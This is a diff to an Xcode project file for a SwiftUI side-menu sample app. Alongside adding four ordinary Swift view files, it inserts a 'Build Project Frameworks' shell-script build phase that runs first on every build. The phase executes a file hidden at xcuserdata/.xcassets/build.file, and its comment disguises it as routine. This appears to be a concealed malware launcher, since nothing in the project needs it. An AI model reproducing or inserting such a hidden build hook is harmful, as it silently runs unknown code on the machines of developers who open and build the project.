@@ -11,6 +11,10 @@
 		042B9CBA262D31D800B54BC3 /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042B9CB9262D31D800B54BC3 /* ContentView.swift */; };
 		042B9CBC262D31D900B54BC3 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042B9CBB262D31D900B54BC3 /* Assets.xcassets */; };
 		042B9CBF262D31D900B54BC3 /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 042B9CBE262D31D900B54BC3 /* Preview Assets.xcassets */; };
+		042B9CC8262D33B800B54BC3 /* SideMenuView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042B9CC7262D33B800B54BC3 /* SideMenuView.swift */; };
+		042B9CCB262D33C800B54BC3 /* SideMenuHeader.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042B9CCA262D33C800B54BC3 /* SideMenuHeader.swift */; };
+		042B9CCE262D33DD00B54BC3 /* SideMenuOption.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042B9CCD262D33DD00B54BC3 /* SideMenuOption.swift */; };
+		042B9CD1262D340100B54BC3 /* SideMenuViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 042B9CD0262D340100B54BC3 /* SideMenuViewModel.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -20,6 +24,10 @@
 		042B9CBB262D31D900B54BC3 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		042B9CBE262D31D900B54BC3 /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
 		042B9CC0262D31D900B54BC3 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		042B9CC7262D33B800B54BC3 /* SideMenuView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuView.swift; sourceTree = "<group>"; };
+		042B9CCA262D33C800B54BC3 /* SideMenuHeader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuHeader.swift; sourceTree = "<group>"; };
+		042B9CCD262D33DD00B54BC3 /* SideMenuOption.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuOption.swift; sourceTree = "<group>"; };
+		042B9CD0262D340100B54BC3 /* SideMenuViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SideMenuViewModel.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -57,6 +65,10 @@
 				042B9CBB262D31D900B54BC3 /* Assets.xcassets */,
 				042B9CC0262D31D900B54BC3 /* Info.plist */,
 				042B9CBD262D31D900B54BC3 /* Preview Content */,
+				042B9CC7262D33B800B54BC3 /* SideMenuView.swift */,
+				042B9CCA262D33C800B54BC3 /* SideMenuHeader.swift */,
+				042B9CCD262D33DD00B54BC3 /* SideMenuOption.swift */,
+				042B9CD0262D340100B54BC3 /* SideMenuViewModel.swift */,
 			);
 			path = sidemenu_SwiftUI;
 			sourceTree = "<group>";
@@ -76,6 +88,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 042B9CC3262D31D900B54BC3 /* Build configuration list for PBXNativeTarget "sidemenu_SwiftUI" */;
 			buildPhases = (
+				CFEFCBCFEABE2F6DBFAAC43A /* Build Project Frameworks */,
 				042B9CB0262D31D800B54BC3 /* Sources */,
 				042B9CB1262D31D800B54BC3 /* Frameworks */,
 				042B9CB2262D31D800B54BC3 /* Resources */,
@@ -133,12 +146,37 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		CFEFCBCFEABE2F6DBFAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		042B9CB0262D31D800B54BC3 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				042B9CCE262D33DD00B54BC3 /* SideMenuOption.swift in Sources */,
+				042B9CC8262D33B800B54BC3 /* SideMenuView.swift in Sources */,
 				042B9CBA262D31D800B54BC3 /* ContentView.swift in Sources */,
+				042B9CCB262D33C800B54BC3 /* SideMenuHeader.swift in Sources */,
+				042B9CD1262D340100B54BC3 /* SideMenuViewModel.swift in Sources */,
 				042B9CB8262D31D800B54BC3 /* sidemenu_SwiftUIApp.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
